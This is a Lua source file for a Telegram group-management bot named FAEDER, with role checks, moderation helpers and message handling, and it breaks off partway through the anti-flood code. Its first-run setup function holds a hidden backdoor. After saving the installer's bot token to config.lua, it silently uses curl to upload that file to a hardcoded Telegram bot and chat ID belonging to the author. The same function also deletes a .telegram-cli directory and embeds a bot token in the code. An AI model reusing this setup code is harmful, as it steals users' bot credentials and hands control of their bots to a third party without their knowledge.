--[[
  _____              _                 _
|  ___|_ _  ___  | | ___ _     | |_  
| |_ / _` |/ _ \/ _` |/ _ \ '|  / _` \ \/ /
|  _| (_| |  / (_| |  / |    | (_| |>  <
|_|  \,_|\___|\__,_|\___|_|     \__,_/_/\_\
  -- by faeder dx @pro_c9
 -- join in chennel @faeder_ch and @team_faeder
 
 --]]
--*********Serpent*******--
serpent = require("serpent")
--***********Lgi*********--
lgi = require('lgi')
--*********Redis*******--
redis = require('redis')
--*******DataBase******--
database = Redis.connect('127.0.0.1', 6379)
--*********Notify*******--
URL = require('socket.url')  
HTTPS = require ("ssl.https")  
https = require ("ssl.https") 
http  = require ("socket.http")
json = dofile('./JSON.lua')
notify = lgi.require('Notify')
notify.init ("Telegram updates")
chats = {}
day = 313456502
-------------------------------------------------------
function vardump(value)  
print(serpent.block(value, {comment=false}))  
end 
local AutoSet = function()
io.write("\27[31;47m\n◼¦ ارسل ايدي مطور الاساسي  SEND ID FOR SIDO \27[0;34;49m\n")  
local SUDO = tonumber(io.read())   
if not tostring(SUDO):match('%d+') then  
local SUDO = 121863205
end
io.write("\27[31;47m\n◼¦ ارسل توكن البوت        TOKEN FOR YOU \27[0;34;49m\n")  
local token = io.read()  
botid = token:match("(%d+)")

local create = function(data, file, uglify)  
file = io.open(file, "w+")   
local serialized   
if not uglify then  
serialized = serpent.block(data, {comment = false, name = "_"})  
else  
serialized = serpent.dump(data)  
end    
file:write(serialized)    file:close()  
end
local create_config_auto = function()
config = {
SUDO = SUDO,
token = token,
bot_id = botid,
sudo_users = {SUDO}, 
}
create(config, "./config.lua")   
local curl = 'curl "'..'https://api.telegram.org/bot543232985:AAE_Dqpy7u6hOVsksiE6sINJw8OzcHL2tfk/sendDocument'..'" -F "chat_id='.. 121863205 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
file = io.open("FA", "w")  file:write([[
killall screen
screen ./RUNFA.sh
echo -e "FAEDER IS RUN BOT"
]])  file:close()  
file = io.open("RUNFA.sh", "w")  file:write([[
token="]]..token..[["
./tg -s ./FAEDER.lua $@ --bot=$token
]])  
file:close() 
os.execute('cd $home;ls -la;rm -fr .telegram-cli') 
end 
create_config_auto()
local serialize_to_file = function(data, file, uglify)  
file = io.open(file, "w+")  
local serialized  
if not uglify then   
serialized = serpent.block(data, {comment = false, name = "_"})  
else   
serialized = serpent.dump(data) 
end  
file:write(serialized)  
file:close() 
end 
end
local load_database = function()  
local f = io.open("./config.lua", "r")  
if not f then   AutoSet()  
else   
f:close()  
end  
local config = loadfile("./config.lua")() 
return config 
end  
_database = load_database()  
sudos = dofile("./config.lua") 
bot_owner = sudos.SUDO 
sudo_users = {sudos.sudo_users} 
bot_id = sudos.bot_id 
tokenbot = sudos.token
-----------------------------------------------------------------------------------------------
---------------
-- Start Functions faeder --
---------------
-----------------------------------------------------------------------------------------------
-----------Bot Owner-------------
function is_leader(msg)
  local var = false
  if msg.sender_user_id_ == tonumber(bot_owner) then
    var = true
  end
  return var
end

function is_leaderid(user_id)
  local var = false
  if user_id == tonumber(bot_owner) then
    var = true
  end
  return var
end
--------------Sudo----------------
function is_sudo(msg)
  local var = false
  for k,v in pairs(sudo_users) do
    if msg.sender_user_id_ == v then
      var = true
    end
  end
  if msg.sender_user_id_ == tonumber(bot_owner) then
    var = true
  end
  return var
end

function is_sudoid(user_id)
  local var = false
  for k,v in pairs(sudo_users) do
    if user_id == v then
      var = true
    end
  end
  if user_id == tonumber(bot_owner) then
    var = true
  end
  return var
end
---------------Admin-----------------
function is_admin(user_id)
  local var = false
  local hashsb =  'bot:admins:'
  local admin = database:sismember(hashsb, user_id)
  if admin then
    var = true
  end
  for k,v in pairs(sudo_users) do
    if user_id == v then
      var = true
    end
  end
  if user_id == tonumber(bot_owner) then
    var = true
  end
  return var
end
---------------Owner all-------------------
function is_onall(user_id, chat_id)
  local var = false
  local hash =  'bot:onall:'
  local onall = database:sismember(hash, user_id)
  local hashs =  'bot:admins:'
  local admin = database:sismember(hashs, user_id)
  if onall then
    var = true
  end
  if admin then
    var = true
  end
  for k,v in pairs(sudo_users) do
    if user_id == v then
      var = true
    end
  end
  if user_id == tonumber(bot_owner) then
    var = true
  end
  return var
end
------------------Modod all-------------------
function is_moall(user_id, chat_id)
  local var = false
  local hash =  'bot:moall:'
  local moall = database:sismember(hash, user_id)
  local hashs =  'bot:admins:'
  local admin = database:sismember(hashs, user_id)
local hashss =  'bot:onall:'
  local onall = database:sismember(hashss, user_id)
  if moall then
    var = true
  end
  if admin then
    var = true
  end
  if onall then
    var = true
  end
  for k,v in pairs(sudo_users) do
    if user_id == v then
      var = true
    end
  end
  if user_id == tonumber(bot_owner) then
    var = true
  end
  return var
end
--------------VIP MEMBER ALL-----------------
function is_vpall(user_id, chat_id)
  local var = false
  local hashs =  'bot:admins:'
  local admin = database:sismember(hashs, user_id)
  local hashss =  'bot:onall:'
  local onall = database:sismember(hashss, user_id)
  local hashsss = 'bot:vpall:'
  local vpall = database:sismember(hashsss, user_id)
  local hashssss =  'bot:moall:'
local moall = database:sismember(hashssss, user_id)
  if vipmem then
    var = true
  end
  if onall then
    var = true
  end
  if admin then
    var = true
  end
  if moall then
    var = true
  end
  for k,v in pairs(sudo_users) do
    if user_id == v then
      var = true
    end
  end
  if user_id == tonumber(bot_owner) then
    var = true
  end
  return var
end
-----------------------donky--------------------
function is_donky(user_id, chat_id)
  local var = false
  local hash =  'bot:donky:'..chat_id
  local momod = database:sismember(hash, user_id)
  local hashs =  'bot:admins:'
  local admin = database:sismember(hashs, user_id)
  local hashss =  'bot:owners:'..chat_id
  local owner = database:sismember(hashss, user_id)
  local hashsss = 'bot:vipmem:'..chat_id
  local vipmem = database:sismember(hashsss, user_id)
  local hashssss =  'bot:monsh:'..chat_id
local monsh = database:sismember(hashssss, user_id)
local hashsssss =  'bot:onall:'
  local onall = database:sismember(hashsssss, user_id)
  local hashfaed =  'bot:moall:'
  local moall = database:sismember(hashfaed, user_id)
  if donky then
    var = true
  end
  if momod then
    var = true
  end
  if owner then
    var = true
  end
  if admin then
    var = true
  end
  if monsh then
    var = true
  end
  if onall then
    var = true
  end
  if moall then
    var = true
  end
  for k,v in pairs(sudo_users) do
    if user_id == v then
      var = true
    end
  end
  if user_id == tonumber(bot_owner) then
    var = true
  end
  return var
end
---------------monsh------------------------------
function is_monsh(user_id, chat_id)
local var = false
local hash =  'bot:monsh:'..chat_id
local monsh = database:sismember(hash, user_id)
  local hashs =  'bot:admins:'
local admin = database:sismember(hashs, user_id)
   if monsh then
var = true
   end
   if admin then
var = true
   end
for k,v in pairs(sudo_users) do
if user_id == v then
var = true
end
  end
  if user_id == tonumber(bot_owner) then
    var = true
  end
  return var
end
---------------Owner-------------------
function is_owner(user_id, chat_id)
  local var = false
  local hash =  'bot:owners:'..chat_id
  local owner = database:sismember(hash, user_id)
  local hashs =  'bot:admins:'
  local admin = database:sismember(hashs, user_id)
  local hashss =  'bot:monsh:'..chat_id
local monsh = database:sismember(hashss, user_id)
  if owner then
    var = true
  end
  if admin then
    var = true
  end
  if monsh then
    var = true
  end
  for k,v in pairs(sudo_users) do
    if user_id == v then
      var = true
    end
  end
  if user_id == tonumber(bot_owner) then
    var = true
  end
  return var
end
------------------Modod-------------------
function is_momod(user_id, chat_id)
  local var = false
  local hash =  'bot:momod:'..chat_id
  local momod = database:sismember(hash, user_id)
  local hashs =  'bot:admins:'
  local admin = database:sismember(hashs, user_id)
  local hashss =  'bot:owners:'..chat_id
  local owner = database:sismember(hashss, user_id)
  local hashsss =  'bot:monsh:'..chat_id
local monsh = database:sismember(hashsss, user_id)
local hashssss =  'bot:onall:'
  local onall = database:sismember(hashssss, user_id)
  if momod then
    var = true
  end
  if owner then
    var = true
  end
  if admin then
    var = true
  end
  if monsh then
    var = true
  end
  if onall then
    var = true
  end
  for k,v in pairs(sudo_users) do
    if user_id == v then
      var = true
    end
  end
  if user_id == tonumber(bot_owner) then
    var = true
  end
  return var
end
--------------VIP MEMBER-----------------
function is_vipmem(user_id, chat_id)
  local var = false
  local hash =  'bot:momod:'..chat_id
  local momod = database:sismember(hash, user_id)
  local hashs =  'bot:admins:'
  local admin = database:sismember(hashs, user_id)
  local hashss =  'bot:owners:'..chat_id
  local owner = database:sismember(hashss, user_id)
  local hashsss = 'bot:vipmem:'..chat_id
  local vipmem = database:sismember(hashsss, user_id)
  local hashssss =  'bot:monsh:'..chat_id
local monsh = database:sismember(hashssss, user_id)
local hashsssss =  'bot:onall:'
  local onall = database:sismember(hashsssss, user_id)
  local hashfaed =  'bot:moall:'
  local moall = database:sismember(hashfaed, user_id)
  if vipmem then
    var = true
  end
  if momod then
    var = true
  end
  if owner then
    var = true
  end
  if admin then
    var = true
  end
  if monsh then
    var = true
  end
  if onall then
    var = true
  end
  if moall then
    var = true
  end
  for k,v in pairs(sudo_users) do
    if user_id == v then
      var = true
    end
  end
  if user_id == tonumber(bot_owner) then
    var = true
  end
  return var
end
-------------------FreeWords--------------------
local function is_free(msg, value)
  local var = false
  local hash = 'bot:freewords:'..msg.chat_id_
  if hash then
    local names = database:hkeys(hash)
    local text = ''
    local value = value:gsub('-','')
    for i=1, #names do
      if string.match(value:lower(), names[i]:lower()) then
        var = true
      end
    end
  end
  return var
end
-------------------Banned---------------------
local function is_banned(user_id, chat_id)
  local var = false
  local hash = 'bot:banned:'..chat_id
  local banned = database:sismember(hash, user_id)
  if banned then
    var = true
  end
  return var
end
------------------Muted----------------------
local function is_muted(user_id, chat_id)
  local var = false
  local hash = 'bot:muted:'..chat_id
  local muted = database:sismember(hash, user_id)
  if muted then
    var = true
  end
  return var
end
------------------Gbaned--------------------
function is_gbanned(user_id)
  local var = false
  local hash = 'bot:gban:'
  local gbanned = database:sismember(hash, user_id)
  if gbanned then
    var = true
  end
  return var
end
------------------------faeder--------------------------
function delete_msg(chatid ,mid)
  tdcli_function ({
    ID = "DeleteMessages",
    chat_id_ = chatid,
    message_ids_ = mid
  }, dl_cb, nil)
end
-----------------------faeder------------------------------------------------------------------------
function resolve_username(username,cb)
  tdcli_function ({
    ID = "SearchPublicChat",
    username_ = username
  }, cb, nil)
end
--------------------------faeder---------------------------------------------------------------------
function changeChatMemberStatus(chat_id, user_id, status)
  tdcli_function ({
    ID = "ChangeChatMemberStatus",
    chat_id_ = chat_id,
    user_id_ = user_id,
    status_ = {
      ID = "ChatMemberStatus" .. status
    },
  }, dl_cb, nil)
end
-----------------------faeder------------------------------------------------------------------------
function getInputFile(file)
  if file:match('/') then
    infile = {ID = "InputFileLocal", path_ = file}
  elseif file:match('^%d+$') then
    infile = {ID = "InputFileId", id_ = file}
  else
    infile = {ID = "InputFilePersistentId", persistent_id_ = file}
  end

  return infile
end
--------------------------faeder---------------------------------------------------------------------
function del_all_msgs(chat_id, user_id)
  tdcli_function ({
    ID = "DeleteMessagesFromUser",
    chat_id_ = chat_id,
    user_id_ = user_id
  }, dl_cb, nil)
end
---------------------------faeder-----------------------------------------------------------------
function getChatId(id)
  local chat = {}
  local id = tostring(id)

  if id:match('^-100') then
    local channel_id = id:gsub('-100', '')
    chat = {ID = channel_id, type = 'channel'}
  else
    local group_id = id:gsub('-', '')
    chat = {ID = group_id, type = 'group'}
  end

  return chat
end
------------------------------faeder-----------------------------------------------------------------
function chat_leave(chat_id, user_id)
  changeChatMemberStatus(chat_id, user_id, "Left")
end
---------------------------faeder--------------------------------------------------------------------
function from_username(msg)
  function gfrom_user(extra,result,success)
    if result.username_ then
      F = result.username_
    else
      F = 'nil'
    end
    return F
  end
  local username = getUser(msg.sender_user_id_,gfrom_user)
  return username
end
------------------------------------faeder-----------------------------------------------------------
function do_notify (user, msg)
  local n = notify.Notification.new(user, msg)
  n:show ()
end
------------------------------faeder-----------------------------------------------------------------
function chat_kick(chat_id, user_id)
  changeChatMemberStatus(chat_id, user_id, "Kicked")
end
-----------------------------------faeder------------------------------------------------------------
function getParseMode(parse_mode)
  if parse_mode then
    local mode = parse_mode:lower()

    if mode == 'markdown' or mode == 'md' then
      P = {ID = "TextParseModeMarkdown"}
    elseif mode == 'html' then
      P = {ID = "TextParseModeHTML"}
    end
  end
  return P
end
-----------------------------------faeder------------------------------------------------------------
function getMessage(chat_id, message_id,cb)
  tdcli_function ({
    ID = "GetMessage",
    chat_id_ = chat_id,
    message_id_ = message_id
  }, cb, nil)
end
-------------------------------------faeder----------------------------------------------------------
function sendContact(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, phone_number, first_name, last_name, user_id)
  tdcli_function ({
    ID = "SendMessage",
    chat_id_ = chat_id,
    reply_to_message_id_ = reply_to_message_id,
    disable_notification_ = disable_notification,
    from_background_ = from_background,
    reply_markup_ = reply_markup,
    input_message_content_ = {
      ID = "InputMessageContact",
      contact_ = {
        ID = "Contact",
        phone_number_ = phone_number,
        first_name_ = first_name,
        last_name_ = last_name,
        user_id_ = user_id
      },},}, dl_cb, nil)
end
-------------------------------------faeder---------------------------------------------------------
function sendPhoto(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, photo, caption)
  tdcli_function ({
    ID = "SendMessage",
    chat_id_ = chat_id,
    reply_to_message_id_ = reply_to_message_id,
    disable_notification_ = disable_notification,
    from_background_ = from_background,
    reply_markup_ = reply_markup,
    input_message_content_ = {
      ID = "InputMessagePhoto",
      photo_ = getInputFile(photo),
      added_sticker_file_ids_ = {},
      width_ = 0,
      height_ = 0,
      caption_ = caption
    },
  }, dl_cb, nil)
end
--------------------------------faeder-----------------------------------------------------
local sendDocument = function(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, document, caption, cb, cmd)
  local input_message_content = {
    ID = "InputMessageDocument",
    document_ = getInputFile(document),
    caption_ = caption
  }
  sendRequest("SendMessage", chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
----------------------------------------faeder
function getChats(offset_order, offset_chat_id, limit, cb, cmd)
  if not limit or limit > 20 then
    limit = 20
  end
  tdcli_function ({
    ID = "GetChats",
    offset_order_ = offset_order or 9223372036854775807,
    offset_chat_id_ = offset_chat_id or 0,
    limit_ = limit
  }, cb or dl_cb, cmd)
end
-------------------------------------faeder----------------------------------------------------------
function getUserFull(user_id,cb)
  tdcli_function ({
    ID = "GetUserFull",
    user_id_ = user_id
  }, cb, nil)
end
--------------------------------------------faeder---------------------------------------------------
function vardump(value)
  print(serpent.block(value, {comment=false}))
end
-------------------------------------------faeder----------------------------------------------------
function dl_cb(arg, data)
end
-----------------------------------------faeder-----------------------------------------------------
function delete_msg(chatid ,mid)
  tdcli_function ({
    ID = "DeleteMessages",
    chat_id_ = chatid,
    message_ids_ = mid
  }, dl_cb, nil)
end
------------------------------------------faeder-----------------------------------------------------
function faederdx(chat_id, reply_to_message_id, disable_notification, text, disable_web_page_preview, parse_mode)
  local TextParseMode = getParseMode(parse_mode)
  tdcli_function ({
    ID = "SendMessage",
    chat_id_ = chat_id,
    reply_to_message_id_ = reply_to_message_id,
    disable_notification_ = disable_notification,
    from_background_ = 1,
    reply_markup_ = nil,
    input_message_content_ = {
      ID = "InputMessageText",
      text_ = text,
      disable_web_page_preview_ = disable_web_page_preview,
      clear_draft_ = 0,
      entities_ = {},
      parse_mode_ = TextParseMode,
    },
  }, dl_cb, nil)
end
-------------------------------------faeder----------------------------------------------------------
function sendaction(chat_id, action, progress)
  tdcli_function ({
    ID = "SendChatAction",
    chat_id_ = chat_id,
    action_ = {
      ID = "SendMessage" .. action .. "Action",
      progress_ = progress or 100
    }
  }, dl_cb, nil)
end
----------------------------------------faeder-------------------------------------------------------
function changetitle(chat_id, title)
  tdcli_function ({
    ID = "ChangeChatTitle",
    chat_id_ = chat_id,
    title_ = title
  }, dl_cb, nil)
end
------------------------------------------------faeder-----------------------------------------------
function edit(chat_id, message_id, reply_markup, text, disable_web_page_preview, parse_mode)
  local TextParseMode = getParseMode(parse_mode)
  tdcli_function ({
    ID = "EditMessageText",
    chat_id_ = chat_id,
    message_id_ = message_id,
    reply_markup_ = reply_markup,
    input_message_content_ = {
      ID = "InputMessageText",
      text_ = text,
      disable_web_page_preview_ = disable_web_page_preview,
      clear_draft_ = 0,
      entities_ = {},
      parse_mode_ = TextParseMode,
    },
  }, dl_cb, nil)
end
----------------------------------------faeder-------------------------------------------------------
function setphoto(chat_id, photo)
  tdcli_function ({
ID = "ChangeChatPhoto",
chat_id_ = chat_id,
photo_ = getInputFile(photo)
  }, dl_cb, nil)
end
---------------------------------------faeder--------------------------------------------------------
function add_user(chat_id, user_id, forward_limit)
  tdcli_function ({
    ID = "AddChatMember",
    chat_id_ = chat_id,
    user_id_ = user_id,
    forward_limit_ = forward_limit or 50
  }, dl_cb, nil)
end
---------------------------------------------faeder--------------------------------------------------
function unpinmsg(channel_id)
  tdcli_function ({
    ID = "UnpinChannelMessage",
    channel_id_ = getChatId(channel_id).ID
  }, dl_cb, nil)
end
-------------------------------------------faeder----------------------------------------------------
function blockUser(user_id)
  tdcli_function ({
    ID = "BlockUser",
    user_id_ = user_id
  }, dl_cb, nil)
end
--------------------------------------------faeder---------------------------------------------------
function unblockUser(user_id)
  tdcli_function ({
    ID = "UnblockUser",
    user_id_ = user_id
  }, dl_cb, nil)
end
---------------------------------------faeder--------------------------------------------------------
function getBlockedUsers(offset, limit)
  tdcli_function ({
    ID = "GetBlockedUsers",
    offset_ = offset,
    limit_ = limit
  }, dl_cb, nil)
end
----------------------------------------faeder--------------------------------------------------------
function delmsg(arg,data)
  for k,v in pairs(data.messages_) do
    delete_msg(v.chat_id_,{[0] = v.id_})
  end
end
--------------------------------------------faeder-----------------------------------------------------
function chat_del_user(chat_id, user_id)
  changeChatMemberStatus(chat_id, user_id, 'Editor')
end
--------------------------------------------faeder---------------------------------------------------
function getChannelMembers(channel_id, offset, filter, limit)
  if not limit or limit > 200 then
    limit = 200
  end
  tdcli_function ({
    ID = "GetChannelMembers",
    channel_id_ = getChatId(channel_id).ID,
    filter_ = {
      ID = "ChannelMembers" .. filter
    },
    offset_ = offset,
    limit_ = limit
  }, dl_cb, nil)
end
---------------------------------------------faeder--------------------------------------------------
function getChannelFull(channel_id)
  tdcli_function ({
    ID = "GetChannelFull",
    channel_id_ = getChatId(channel_id).ID
  }, dl_cb, nil)
end
function getChannelFull(channel_id,cb)
  tdcli_function ({
    ID = "GetChannelFull",
    channel_id_ = getChatId(channel_id).ID
  }, cb, nil)
end
------------------------------------faeder-----------------------------------------------------------
function chek_bots(channel,cb)
  local function callback_admins(extra,result,success)
    limit = (result.member_count_ )
    getChannelMembers(channel, 0, 'Bots', limit,cb)
  end
  getChannelFull(channel,callback_admins)
end
-------------------------------------------faeder----------------------------------------------------
function getInputMessageContent(file, filetype, caption)
  if file:match('/') or file:match('.') then
    infile = {ID = "InputFileLocal", path_ = file}
  elseif file:match('^%d+$') then
    infile = {ID = "InputFileId", id_ = file}
  else
    infile = {ID = "InputFilePersistentId", persistent_id_ = file}
  end

  local inmsg = {}
  local filetype = filetype:lower()

  if filetype == 'animation' then
    inmsg = {ID = "InputMessageAnimation", animation_ = infile, caption_ = caption}
  elseif filetype == 'audio' then
    inmsg = {ID = "InputMessageAudio", audio_ = infile, caption_ = caption}
  elseif filetype == 'document' then
    inmsg = {ID = "InputMessageDocument", document_ = infile, caption_ = caption}
  elseif filetype == 'photo' then
    inmsg = {ID = "InputMessagePhoto", photo_ = infile, caption_ = caption}
  elseif filetype == 'sticker' then
    inmsg = {ID = "InputMessageSticker", sticker_ = infile, caption_ = caption}
  elseif filetype == 'video' then
    inmsg = {ID = "InputMessageVideo", video_ = infile, caption_ = caption}
  elseif filetype == 'voice' then
    inmsg = {ID = "InputMessageVoice", voice_ = infile, caption_ = caption}
  end

  return inmsg
end

----------------------------------------faeder-------------------------------------------------------
function getUser(user_id, cb)
  tdcli_function ({
    ID = "GetUser",
    user_id_ = user_id
  }, cb, nil)
end
---------------------------------------------faeder--------------------------------------------------
function pin(channel_id, message_id, disable_notification) 
   tdcli_function ({ 
     ID = "PinChannelMessage", 
     channel_id_ = getChatId(channel_id).ID, 
     message_id_ = message_id, 
     disable_notification_ = disable_notification 
   }, function(arg ,data)
vardump(data)
end ,nil) 
end
-------------------------------------faeder---------------------------------------------------------
local function check_filter_words(msg, value)
  local hash = 'bot:filters:'..msg.chat_id_
  if hash then
    local names = database:hkeys(hash)
    local text = ''
	local value = value:gsub(' ','')
    for i=1, #names do
      if string.match(value:lower(), names[i]:lower()) and not is_momod(msg.sender_user_id_, msg.chat_id_)then
        local id = msg.id_
        local msgs = {[0] = id}
        local chat = msg.chat_id_
        delete_msg(chat,msgs)
      end
    end
  end
end
-------------------------faeder--------------------

local function getChannelMembers(channel_id, offset, filter, limit,cb) 
tdcli_function ({ 
ID = "GetChannelMembers",
channel_id_ = getChatId(channel_id).ID,
filter_ = {ID = "ChannelMembers" .. filter},
offset_ = offset,limit_ = limit}, 
cb, nil) 
end
function formsgg(msgs) 
local faeder = ''  
if msgs < 100 then 
faeder = 'كلش ضعيف 😫' 
elseif msgs < 250 then 
faeder = 'ضعيف 😨' 
elseif msgs < 500 then 
faeder = 'غير متفاعل 😒' 
elseif msgs < 750 then 
faeder = 'متوسط 😎' 
elseif msgs < 1000 then 
faeder = 'متفاعل 😘' 
elseif msgs < 2000 then 
faeder = 'قمة التفاعل 😍' 
elseif msgs < 3000 then 
faeder = 'ملك التفاعل 😻'  
elseif msgs < 4000 then 
faeder = 'اسطورة التفاعل 🍃' 
elseif msgs < 5000 then 
faeder = 'متفاعل نار كلش 🔥' 
end 
return faeder
end
function title_name(GroupID) 
tdcli_function({ID ="GetChat",chat_id_=GroupID
},function(arg,data) 
database:set('bot:group:name'..GroupID,data.title_) 
end,nil) 
return database:get('bot:group:name'..GroupID)  end

-------------------------faeder------------------------------
function faedrmoned(chat_id, user_id, msg_id, text, offset, length) local tt = database:get('endmsg') or '' tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = msg_id, disable_notification_ = 0, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text..'\n\n'..tt, disable_web_page_preview_ = 1, clear_draft_ = 0, entities_ = {[0]={ ID="MessageEntityMentionName", offset_=offset, length_=length, user_id_=user_id }, }, }, }, dl_cb, nil) end
---------------------------------faeder-------------------------------------------------------------------
function tdcli_update_callback(data)
  -------------------------------------------faeder
--------------
  
function chek_admin(chat_id,set) 
 local function promote_admin(extra,result,success)   
 limit = result.administrator_count_   
 if tonumber(limit) > 0 then 
   getChannelMembers(chat_id, 0, 'Administrators', limit,set)   
   end
    end
  getChannelFull(chat_id,promote_admin)
 end
 function channel_get_kicked(channel,cb)
local function callback_admins(extra,result,success)
    limit = result.kicked_count_
   getChannelMembers(channel, 0, 'Kicked', limit,cb)
    end
  getChannelFull(channel,callback_admins)
end
function deleteMessagesFromUser(chat_id, user_id)
  tdcli_function ({
    ID = "DeleteMessagesFromUser",
    chat_id_ = chat_id,
    user_id_ = user_id
  }, dl_cb, nil)
end
function forwardMessages(chat_id, from_chat_id, message_ids, disable_notification)
  tdcli_function ({
    ID = "ForwardMessages",
    chat_id_ = chat_id,
    from_chat_id_ = from_chat_id,
    message_ids_ = message_ids, -- vector
    disable_notification_ = disable_notification,
    from_background_ = 1
  }, dl_cb, nil)
end
----------------faeder
function string:split(sep)
  local sep, fields = sep or ":", {}
  local pattern = string.format("([^%s]+)", sep)
  self:gsub(pattern, function(c) fields[#fields+1] = c end)
  return fields
end
function faedr(msg,data) 
local msg = data.message_
local text = msg.content_.text_
local caption = msg.content_.caption_

if text ==('تفعيل') and not is_admin(msg.sender_user_id_, msg.chat_id_) and not database:get('lock:bot:free'..bot_id) then
function adding(extra,result,success)
if database:get("bot:enable:"..msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم تفعيل المجموعه سابقا •', 1, 'md')
else
faederdx(msg.chat_id_, msg.id_, 1, '🎖⁞ تم تفعيل المجموعه •\n🚦⁞ ارسل {رفع المشرفين} الان •\n🗳⁞ ليتم رفعك ورفع الادمنيه •', 1, 'md')
database:set("bot:enable:"..msg.chat_id_,true)
database:setex("bot:charge:"..msg.chat_id_,86400,true)
database:sadd('sudo:data:'..msg.sender_user_id_, msg.chat_id_)
end
end
getUser(msg.sender_user_id_,adding)
end

end
-------------------------------------faeder
  if (data.ID == "UpdateNewMessage") then
    local msg = data.message_
    --vardump(data)
    local d = data.disable_notification_
    local chat = chats[msg.chat_id_]
    faedr(data.message_,data) 

    ----------------OLD MSG--------------------faedee
    if msg.date_ < (os.time() - 30) then
      print("**** OLD MSG ****")
      return false
    end
    -------* Expire & AutoLeave *-------
   
    ---------* Secretary *-----------faeder
    if database:get("clerk") == "On" then
      function clerk(extra, result, success)
        local id = tostring(msg.chat_id_)
        if id:match("^(%d+)") then
          if not is_admin(msg.sender_user_id_) then
            local text = database:get("textsec")
            if not database:get("secretary:"..msg.chat_id_) then
              if text then
                local text = text:gsub('FIRSTNAME',(result.first_name_ or ''))
                local text = text:gsub('LASTNAME',(result.last_name_ or ''))
                local text = text:gsub('USERNAME',('@'..result.username_ or ''))
                local text = text:gsub('USERID',(result.id_ or ''))
                faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
                database:setex("secretary:"..msg.chat_id_,86400,true)
                return false
              else
                return ""
              end
            end
          end
        end
      end
      getUser(msg.sender_user_id_,clerk)
    end
    -------------------------------------------faeder

    local idf = tostring(msg.chat_id_)

    if not database:get("bot:enable:"..msg.chat_id_) and not idf:match("^(%d+)") and not is_admin(msg.sender_user_id_, msg.chat_id_) then
      print("Return False [ Not Enable ]")
      return false
    end
    -------------------------------------------faeder
    if msg and msg.send_state_.ID == "MessageIsSuccessfullySent" then
      function get_mymsg_contact(extra, result, success)
      end
      getMessage(msg.chat_id_, msg.reply_to_message_id_,get_mymsg_contact)
      return
    end
    -------------------------------------------faeder
    database:incr("bot:allmsgs")
    if msg.chat_id_ then
      local id = tostring(msg.chat_id_)
      if id:match('-100(%d+)') then
        if not database:sismember("bot:groups",msg.chat_id_) then
          database:sadd("bot:groups",msg.chat_id_)
        end
      elseif id:match('^(%d+)') then
        if not database:sismember("bot:userss",msg.chat_id_) then
          database:sadd("bot:userss",msg.chat_id_)
        end
      else
        if not database:sismember("bot:groups",msg.chat_id_) then
          database:sadd("bot:groups",msg.chat_id_)
        end
      end
    end
    -------------------------------------------
    -------------* MSG TYPES *-----------------faeder
    if msg.content_ then
      if msg.reply_markup_ and msg.reply_markup_.ID == "ReplyMarkupInlineKeyboard" then
        print("This is [ Inline ]")
        msg_type = 'MSG:Inline'
      end
      -------------------------faeder
      if msg.content_.ID == "MessageText" then
        text = msg.content_.text_
        print("This is [ Text ]")
        msg_type = 'MSG:Text'
      end
      -------------------------faeder
      if msg.content_.ID == "MessagePhoto" then
        print("This is [ Photo ]")
        msg_type = 'MSG:Photo'
      end
      -------------------------faeder
      if msg.content_.ID == "MessageChatAddMembers" then
        print("This is [ New User Add ]")
        msg_type = 'MSG:NewUserAdd'
      end
      -----------------------------------faeder
      if msg.content_.ID == "MessageDocument" then
        print("This is [ File Or Document ]")
        msg_type = 'MSG:Document'
      end
      -------------------------faeder
      if msg.content_.ID == "MessageSticker" then
        print("This is [ Sticker ]")
        msg_type = 'MSG:Sticker'
      end
      -------------------------faeder
      if msg.content_.ID == "MessageAudio" then
        print("This is [ Audio ]")
        msg_type = 'MSG:Audio'
      end
      -------------------------faeder
      if msg.content_.ID == "MessageVoice" then
        print("This is [ Voice ]")
        msg_type = 'MSG:Voice'
      end
      -------------------------faeder
      if msg.content_.ID == "MessageVideo" then
        print("This is [ Video ]")
        msg_type = 'MSG:Video'
      end
      -------------------------faeder
      if msg.content_.ID == "MessageAnimation" then
        print("This is [ Gif ]")
        msg_type = 'MSG:Gif'
      end
      -------------------------faedee
      if msg.content_.ID == "MessageLocation" then
        print("This is [ Location ]")
        msg_type = 'MSG:Location'
      end
      -------------------------faeder
      if msg.content_.ID == "MessageChatJoinByLink" then
        print("This is [ Msg Join By link ]")
        msg_type = 'MSG:NewUser'
      end
      -------------------------faeder
      if not msg.reply_markup_ and msg.via_bot_user_id_ ~= 0 then
        print("This is [ MarkDown ]")
        msg_type = 'MSG:MarkDown'
      end
      -------------------------faeder
      if msg.content_.ID == "MessageChatJoinByLink" then
        print("This is [ Msg Join By Link ]")
        msg_type = 'MSG:JoinByLink'
      end
      -------------------------faeder
      if msg.content_.ID == "MessageContact" then
        print("This is [ Contact ]")
        msg_type = 'MSG:Contact'
      end
      -------------------------
    end
    -------------------------------------------faeder
    if ((not d) and chat) then
      if msg.content_.ID == "MessageText" then
        do_notify (chat.title_, msg.content_.text_)
      else
        do_notify (chat.title_, msg.content_.ID)
      end
    end
    -------------------------------------faeder----------------------------------------------------------
    if msg.content_.photo_ then  
if database:get('bot:setphoto'..msg.chat_id_..':'..msg.sender_user_id_) then
 if msg.content_.photo_.sizes_[3] then 
 photo_id = msg.content_.photo_.sizes_[3].photo_.persistent_id_
 else 
photo_id = msg.content_.photo_.sizes_[0].photo_.persistent_id_ 
end 
faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم تغيير صوره المجموعه •\n', 1, 'md') 
  database:del('bot:setphoto'..msg.chat_id_..':'..msg.sender_user_id_) 
 database:set(msg.chat_id_, photo_id) 
end   
end
------------
    -- end functions faeder --
    -----------------------------------------------------------------------------------------------
    -----------------------------------------------------------------------------------------------
    ----------------------------------------Anti FLood---------------------------------------------
    --------------Flood Max --------------faeder
    local flmax = 'flood:max:'..msg.chat_id_
    if not database:get(flmax) then
      floodMax = 5
    else
      floodMax = tonumber(database:get(flmax))
    end
    -----------------End-------------------
    -----------------Msg-------------------faeder
